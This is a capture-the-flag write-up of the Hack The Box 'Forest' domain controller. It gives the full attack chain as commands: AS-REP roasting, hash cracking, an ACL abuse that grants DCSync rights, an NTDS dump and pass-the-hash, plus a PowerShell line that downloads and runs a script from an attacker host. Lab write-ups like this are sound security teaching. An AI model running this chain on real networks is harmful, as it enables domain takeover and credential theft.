---
title: "[HTB] Forest Writeup"
date: 2026-05-21 14:00:00 +0900
author: aestera
categories: [HTB, Writeup]
tags: [Windows, AD]
description: HTB Forest write-up
math: true
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/7dedecb452597150647e73c2dd6c24c7.png
---

# TL;DR

**AS-REP Roasting** exposed the `svc-alfresco` account, whose hash was cracked to recover the password `s3rvice`. Using this credential, WinRM access was obtained. BloodHound revealed an ACL abuse path through **Account Operators** group and **Exchange Windows Permissions** group, allowing **DCSync** privileges to be granted. The NTDS dump then exposed the Administrator NTLM hash, which was used to gain Domain Controller access.

---

## 1. Recon

Nmap scan result showed that the target was a Windows Active Directory Domain Controller. Several AD-related services were exposed, including DNS, Kerberos, LDAP, SMB, and WinRM.

**port scan result**
![2026-04-28-20-42-21](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/28/2026-04-28-20-42-21-1777376543827.png)

---

## 2. Initial Access - AS-REP Roasting

LDAP enumeration was performed without valid credentials.
```bash
└─$ nxc ldap 10.129.95.210 -u '' -p '' --users
```
![2026-04-28-21-21-59](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/04/28/2026-04-28-21-21-59-1777378922525.png)
The enumeration output disclosed multiple domain user accounts. The **svc-alfresco** account was identified as a valid domain user and was later confirmed to be vulnerable to **AS-REP Roasting**.

**AS-REP Roasting** is possible when Kerberos pre-authentication is disabled for a user account. In this configuration, an attacker can request an AS-REP response for the account and attempt to crack the encrypted response offline.

```bash
└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -request
```
![2026-05-01-14-19-06](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-14-19-06-1777612749912.png)
The AS-REP hash for `svc-alfresco` was successfully obtained.

The recovered hash was then cracked offline using hashcat with the `rockyou.txt`

```bash
└─$ hashcat -m 18200 -a 0 asreproast.hash /usr/share/wordlists/rockyou.txt
```

![2026-05-01-14-39-49](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-14-39-49-1777613993254.png)
```
svc-alfresco:s3rvice
```

The recovered credential was used to authenticate to the target through WinRM.

```bash
└─$ evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

![2026-05-01-14-55-15](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-14-55-15-1777614919313.png)

---

## 3. Privilege Escalation - ACL Abuse to DCSync

After initial access was obtained, AD enumeration using **bloodhound** was performed using the compromised `svc-alfresco` credentials.

```bash
└─$ sudo bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c All -dc forest.htb.local --zip
```

![2026-05-01-16-38-13](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-16-38-13-1777621097476.png)
**BloodHound** identified the following privilege escalation path.

```
svc-alfresco
  -> member of Account Operators
  -> GenericAll over Exchange Windows Permissions
  -> WriteDACL over htb.local domain
```

The `svc-alfresco` user was a member of the **Account Operators** group. This group had **GenericAll** privileges over the **Exchange Windows Permissions** group.

The Exchange Windows Permissions group had **WriteDACL** privileges over the **htb.local** domain object. Therefore, by adding `svc-alfresco` to Exchange Windows Permissions, it was possible to abuse **WriteDACL** and grant `svc-alfresco` **DCSync** rights over the domain.

First, `powerview.ps` was loaded in memory.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.107:80/powerview.ps1')
```

Then, `svc-alfresco` was added to the **Exchange Windows Permissions** group.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
```

After that, a credential object was created for `svc-alfresco` and ysing the newly abused ACL path, **DCSync** rights were granted to `svc-alfresco`.

```powershell
$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)

Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -TargetIdentity 'htb.local\domain admins' -Rights DCSync
```

With **DCSync** privileges assigned, the NTDS database was dumped remotely.

```bash
└─$ nxc smb 10.129.200.15 -u svc-alfresco -p 's3rvice' --ntds       
```
![2026-05-01-18-26-49](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-18-26-49-1777627612507.png)

The Administrator NTLM hash was recovered from the dump.

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::
```

The recovered NTLM hash was then used for Pass-the-Hash authentication through WinRM and administrative access was successfully obtained.

```bash
└─$ evil-winrm -i 10.129.200.15 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

![2026-05-01-18-39-22](https://pub-c64d7608f6724ae48e3b199d196d7dcd.r2.dev/obsidian/2026/05/01/2026-05-01-18-39-22-1777628364579.png)